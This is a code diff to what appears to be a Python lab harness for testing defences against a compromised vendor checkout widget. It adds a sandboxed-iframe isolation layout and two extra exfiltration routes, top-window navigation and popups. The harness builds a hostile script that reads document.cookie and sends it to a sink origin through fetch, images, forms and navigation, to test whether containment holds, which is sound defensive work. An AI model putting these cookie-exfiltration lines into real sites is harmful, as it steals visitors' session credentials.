@@ -35,6 +35,10 @@ document.addEventListener('DOMContentLoaded', function () {
 
 
 EXFIL_CHANNELS = ("fetch", "image", "form", "navigation")
+# Two further routes an attacker turns to once the page itself is locked
+# down: navigating the top-level window from inside a frame, and opening a
+# new window. Tried against the sandboxed-frame isolation containment.
+ADAPTIVE_CHANNELS = ("top_navigation", "popup")
 
 _EXFIL = {
     # A request through the Fetch API; governed by CSP connect-src.
@@ -49,6 +53,10 @@ _EXFIL = {
     # A top-level navigation; no CSP directive in current browsers
     # restricts where a page may navigate itself.
     "navigation": "window.location.href = SINK + '/exfil-nav?c=' + DATA;",
+    # From inside a frame, the top-level window instead of the frame itself.
+    "top_navigation": "window.top.location.href = SINK + '/exfil-top?c=' + DATA;",
+    # A new window, which does not inherit the page's CSP restrictions on fetches.
+    "popup": "window.open(SINK + '/exfil-popup?c=' + DATA);",
 }
 
 
@@ -65,7 +73,7 @@ def malicious_script(sink_origin: str, channel: str = "fetch") -> bytes:
         "  var b = document.getElementById('checkout-button');\n"
         "  if (b) { b.disabled = false; }\n"
         "  var SINK = '" + sink_origin + "';\n"
-        "  var DATA = encodeURIComponent(document.cookie || 'none');\n"
+        "  var DATA = 'none'; try { DATA = encodeURIComponent(document.cookie || 'none'); } catch (e) {}\n"
         "  " + _EXFIL[channel] + "\n"
         "});\n"
     ).encode("utf-8")
@@ -85,6 +93,66 @@ PAGE_TEMPLATE = """<!doctype html>
   {extra_script_tag}
 </body></html>
 """
+
+
+# Sandboxed-frame isolation. The vendor script no longer runs in the
+# operator's page. It runs in a frame the operator serves from its own
+# origin, sandboxed with allow-scripts only (no same-origin, forms, popups
+# or top navigation), under its own CSP that allows no fetch, image or
+# form destination. The parent's frame-src 'self' stops the frame from
+# navigating itself anywhere else. The widget's one visible effect,
+# enabling checkout, crosses the boundary as a single typed message that
+# the operator's own host bridge accepts only from that frame.
+ISOLATED_PAGE_TEMPLATE = """<!doctype html>
+<html><head><meta charset="utf-8"><title>Lab checkout page</title>
+<meta http-equiv="Content-Security-Policy" content="frame-src 'self'">
+</head>
+<body>
+  <h1>Lab checkout page</h1>
+  <button id="checkout-button" disabled>Checkout</button>
+  <img src="/canary.gif" alt="" width="1" height="1">
+  <iframe data-ps-isolated sandbox="allow-scripts" src="/isolated/vendor-frame.html"
+          title="vendor widget" width="1" height="1" style="border:0"></iframe>
+  <script src="/isolated/host-bridge.js"></script>
+</body></html>
+"""
+
+FRAME_TEMPLATE = """<!doctype html>
+<html><head><meta charset="utf-8"></head>
+<body>
+  <button id="checkout-button" disabled hidden></button>
+  <script src="/isolated/frame-bridge.js"></script>
+  <script src="{script_url}"></script>
+</body></html>
+"""
+
+# Runs inside the frame, before the vendor script. After the vendor's own
+# DOMContentLoaded handler has run, report the one fact the parent needs.
+FRAME_BRIDGE_JS = b"""
+document.addEventListener('DOMContentLoaded', function () {
+  setTimeout(function () {
+    var b = document.getElementById('checkout-button');
+    parent.postMessage({type: 'predict-shield-widget', enabled: !!(b && !b.disabled)}, '*');
+  }, 0);
+});
+"""
+
+# Runs in the operator's page. Accepts only the typed message, only from
+# the isolated frame, and can only ever enable the one button.
+HOST_BRIDGE_JS = b"""
+window.addEventListener('message', function (e) {
+  var f = document.querySelector('iframe[data-ps-isolated]');
+  if (!f || e.source !== f.contentWindow) { return; }
+  var d = e.data;
+  if (!d || d.type !== 'predict-shield-widget' || typeof d.enabled !== 'boolean') { return; }
+  if (d.enabled === true) { document.getElementById('checkout-button').disabled = false; }
+});
+"""
+
+
+def frame_csp(vendor_source: str) -> str:
+    return ("default-src 'none'; script-src 'self' " + vendor_source +
+            "; form-action 'none'; base-uri 'none'")
 
 
 class VendorState:
@@ -110,6 +178,8 @@ class VendorState:
         # Whether the vendor sends CORS headers. A browser refuses a
         # cross-origin SRI-pinned script without them.
         self.vendor_cors = True
+        # Serve the sandboxed-frame isolation layout instead of the direct tag.
+        self.isolate = False
         self.vendor_origin = ""   # set once the vendor server's real port is known
         self.site_origin = ""     # set once the site server's real port is known
         self.sink_origin = ""
@@ -155,6 +225,19 @@ def make_site_handler(state: VendorState):
                 script_url = state.vendor_origin + "/widget.js"
                 extra = state.extra_script_tag
                 attrs = state.script_attrs
+                isolate = state.isolate
+                vendor_source = state.vendor_origin.split("://", 1)[-1]
+            static = {
+                "/isolated/frame-bridge.js": FRAME_BRIDGE_JS,
+                "/isolated/host-bridge.js": HOST_BRIDGE_JS,
+            }
+            if self.path in static:
+                self._send(200, "application/javascript", static[self.path])
+                return
+            if self.path == "/isolated/vendor-frame.html":
+                self._send(200, "text/html", FRAME_TEMPLATE.format(script_url=script_url).encode("utf-8"),
+                           csp=frame_csp(vendor_source))
+                return
             if self.path == "/canary.gif":
                 # A page-owned, known-benign request, independent of the
                 # vendor script: if the browser instrumentation does not
@@ -167,7 +250,11 @@ def make_site_handler(state: VendorState):
                 self.wfile.write(_GIF)
                 return
             if self.path == "/page.html":
-                payload = PAGE_TEMPLATE.format(script_url=script_url, script_attrs=attrs, extra_script_tag=extra).encode("utf-8")
+                if isolate:
+                    payload = ISOLATED_PAGE_TEMPLATE.encode("utf-8")
+                else:
+                    payload = PAGE_TEMPLATE.format(script_url=script_url, script_attrs=attrs,
+                                                   extra_script_tag=extra).encode("utf-8")
                 self.send_response(200)
                 self.send_header("Content-Type", "text/html")
                 self.send_header("Content-Length", str(len(payload)))
@@ -178,6 +265,15 @@ def make_site_handler(state: VendorState):
             else:
                 self.send_response(404)
                 self.end_headers()
+
+        def _send(self, status, content_type, body, csp=None):
+            self.send_response(status)
+            self.send_header("Content-Type", content_type)
+            self.send_header("Content-Length", str(len(body)))
+            if csp:
+                self.send_header("Content-Security-Policy", csp)
+            self.end_headers()
+            self.wfile.write(body)
 
         def log_message(self, *args):
             pass
